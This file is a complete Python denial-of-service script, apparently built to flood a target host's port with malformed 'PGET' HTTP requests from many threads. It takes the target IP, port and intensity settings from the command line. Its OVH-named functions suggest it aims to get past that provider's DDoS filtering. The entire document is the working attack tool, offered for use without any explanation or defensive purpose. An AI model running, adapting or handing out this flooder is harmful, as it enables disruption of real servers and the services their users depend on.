import random,threading,socket,sys,struct
from binascii import unhexlify
hex = [2, 4, 8, 16, 32, 64, 128]

def generate_end(length=4, chara='\n\r'):
  d = ''.join(random.choice(chara) for _ in range(length))
  return d

def OVH_BUILDER():
  packet_list = []
  for h2 in hex:
    for h in hex:
       random_part = random.choice(("*", "**", "***","****","*****"))
       string_hex = str(unhexlify('{0:032x}'.format(random.randrange(h2 + len(random_part) + h))))
       path = ['/0/0/0/0/0/0','/0/0/0/0/0/0/','\0\0\0\0\0\0','\0\0\0\0\0\0\\']
       for p in path:
        end = generate_end()
        packet_list.extend([
          f'PGET {p}{string_hex} HTTP/1.1\nHost: {ip}:{port}{end}',
          f'PGET {p}{string_hex} HTTP/1.1\nHost: {ip}{end}',
        ])
  return packet_list

def OVH(ip,port,times,booter):
  for _ in range(times):
    try:
      s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      s.connect((ip,port)), s.connect_ex((ip,port))
      packet = OVH_BUILDER()
      for a in packet:
        a = a.encode()
        for _ in range(booter):
          s.sendall(a)
          s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
    except:pass
  
ip = sys.argv[1]
port = int(sys.argv[2])
threader = int(sys.argv[3])
times = int(sys.argv[4])
booter = int(sys.argv[5])
[threading.Thread(target=OVH,args=(ip,port,times,booter)).start() for _ in range(threader*5)]
